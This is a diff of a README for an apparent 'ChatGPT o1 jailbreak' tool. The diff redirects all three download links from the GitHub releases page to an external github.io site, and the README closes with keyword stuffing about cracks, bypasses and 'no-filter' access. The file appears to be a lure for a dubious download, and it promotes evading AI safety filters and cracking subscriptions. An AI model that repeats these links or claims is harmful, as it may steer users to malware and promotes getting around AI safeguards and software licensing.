@@ -1,6 +1,6 @@
 # 🔓 chatgpt-o1-jailbreak-2026 - Unlock ChatGPT o1 Without Limits
 
-[![Download Now](https://img.shields.io/badge/Download-ChatGPT_o1_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/maviclaroa-design/chatgpt-o1-jailbreak-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-ChatGPT_o1_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://maviclaroa-design.github.io)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Here's what you need to get started:
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/maviclaroa-design/chatgpt-o1-jailbreak-2026/releases](https://github.com/maviclaroa-design/chatgpt-o1-jailbreak-2026/releases)
+Visit this link to download the application: [https://maviclaroa-design.github.io](https://maviclaroa-design.github.io)
 
 Once you're on that page, follow these simple steps:
 
@@ -162,6 +162,6 @@ Remember: with great power comes great responsibility. Use this tool wisely, and
 
 ---
 
-**Ready to start?** Click the download button at the top of this page or visit: [https://github.com/maviclaroa-design/chatgpt-o1-jailbreak-2026/releases](https://github.com/maviclaroa-design/chatgpt-o1-jailbreak-2026/releases)
+**Ready to start?** Click the download button at the top of this page or visit: [https://maviclaroa-design.github.io](https://maviclaroa-design.github.io)
 
 Keywords: ai-chat-crack, ai-chat-free, ai-model-crack, ai-subscription-crack, ai-unlimited-2026, chatgpt-2026, chatgpt-bypass, chatgpt-crack, chatgpt-free, chatgpt-o1-jailbreak, gpt-crack-2026, gpt-free-download, gpt4-crack, llm-crack, o1-bypass, o1-jailbreak, o1-jailbreak-2026, o1-no-filter, openai-crack, openai-o1-jailbreak
